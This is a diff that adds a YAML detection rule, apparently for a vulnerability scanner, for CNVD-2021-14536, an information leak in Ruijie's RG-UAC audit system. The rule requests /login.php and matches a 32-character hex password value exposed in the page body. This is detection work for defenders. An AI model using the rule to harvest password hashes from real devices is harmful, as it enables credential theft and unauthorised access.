@@ -1,0 +1,14 @@
+id: CNVD-2021-14536
+
+info:
+    name: 锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞
+    author: jweny(https://github.com/jweny)
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /login.php
+        expression: response.status == 200 && response.body.bcontains(b"<title>RG-UAC登录页面</title>") && response.body.bcontains(b"get_dkey_passwd") && "\"password\":\"[a-f0-9]{32}\"".bmatches(response.body)
+expression: r0()
